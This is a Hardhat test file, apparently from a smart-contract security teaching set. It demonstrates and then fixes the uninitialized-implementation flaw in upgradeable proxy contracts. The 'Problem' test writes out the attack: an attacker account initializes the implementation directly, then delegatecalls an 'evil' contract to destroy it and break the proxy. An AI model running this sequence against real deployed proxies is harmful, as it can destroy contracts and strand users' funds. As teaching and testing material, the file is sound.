const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("UninitializedImplementationContract", function () {
  
  async function deploy() {
    /// Get accounts
    let [deployer, admin, attacker] = await ethers.getSigners();

    /// Deploy testing contracts
    const JustAnEvilGetAdminContract = await ethers.getContractFactory("JustAnEvilGetAdminContract");
    const UninitializedImplementationProblem = await ethers.getContractFactory("UninitializedImplementationProblem");
    const UninitializedImplementationSolution = await ethers.getContractFactory("UninitializedImplementationSolution");

    const evilGetAdmin = await JustAnEvilGetAdminContract.connect(deployer).deploy();
    const number = 10;
    const uninitializedImplementationProblem = await UninitializedImplementationProblem.connect(deployer).deploy(number);
    const uninitializedImplementationSolution = await UninitializedImplementationSolution.connect(deployer).deploy(number);
    
    return { evilGetAdmin, uninitializedImplementationProblem, uninitializedImplementationSolution, deployer, admin, attacker };
  }

  describe("Test uninitialized implementation contract", () => {
    it("Problem: The implementation contract has not been initialized, or disabled the initializers.", async () => {
      const { evilGetAdmin, uninitializedImplementationProblem, uninitializedImplementationSolution, deployer, admin, attacker } = await deploy();
      /// Deploy and initialize proxy contract
      const UninitializedImplementationProblem = await ethers.getContractFactory("UninitializedImplementationProblem");
      const SimpleProxyWithoutCollision = await ethers.getContractFactory("SimpleProxyWithoutCollision");
      const proxy = await SimpleProxyWithoutCollision.connect(admin).deploy(uninitializedImplementationProblem.address);
      const version = 5;
      const proxy_as_UninitializedImplementationProblem = UninitializedImplementationProblem.attach(proxy.address);
      await proxy_as_UninitializedImplementationProblem.connect(admin).initialize(version);

      console.log(`-- Before the attack --`);
      let code = await ethers.provider.getCode(uninitializedImplementationProblem.address);
      console.log(`implementation.code.length: ${code.length}`);
      console.log(`implementation.code: ${code}`);
      let currentVersion = await proxy_as_UninitializedImplementationProblem.getVersion()
      console.log(`version : ${currentVersion}`);

      /// The attacker initializes the implementation contract
      await uninitializedImplementationProblem.connect(attacker).initialize(version);
      /// then uses getAdminButDelegatecall() to delegate calls to destroy the implementation contract
      await uninitializedImplementationProblem.connect(attacker).setAdminButDelegatecall(evilGetAdmin.address, attacker.address);

      console.log(`-- After the attack --`);
      code = await ethers.provider.getCode(uninitializedImplementationProblem.address);
      console.log(`implementation.code.length: ${code.length}`);
      console.log(`implementation.code: ${code}`);
      /// The implementation contract can no longer used by proxy contract
      await expect(proxy_as_UninitializedImplementationProblem.getVersion()).to.be.reverted;
    });

    it("Solution: The implementation should be initialized, or disable the initializer.", async () => {
      const { evilGetAdmin, uninitializedImplementationProblem, uninitializedImplementationSolution, deployer, admin, attacker } = await deploy();
      /// Deploy and initialize proxy contract
      const UninitializedImplementationSolution = await ethers.getContractFactory("UninitializedImplementationSolution");
      const SimpleProxyWithoutCollision = await ethers.getContractFactory("SimpleProxyWithoutCollision");
      const proxy = await SimpleProxyWithoutCollision.connect(admin).deploy(uninitializedImplementationSolution.address);
      const version = 5;
      const proxy_as_UninitializedImplementationSolution = UninitializedImplementationSolution.attach(proxy.address);
      await proxy_as_UninitializedImplementationSolution.connect(admin).initialize(version);

      /// The attacker trying initializes the implementation contract, but it will be failed
      await expect(
        uninitializedImplementationSolution.connect(attacker).initialize(version)
      ).to.be.revertedWith(
        "This contract is already initialized"
      );
    });
  });

});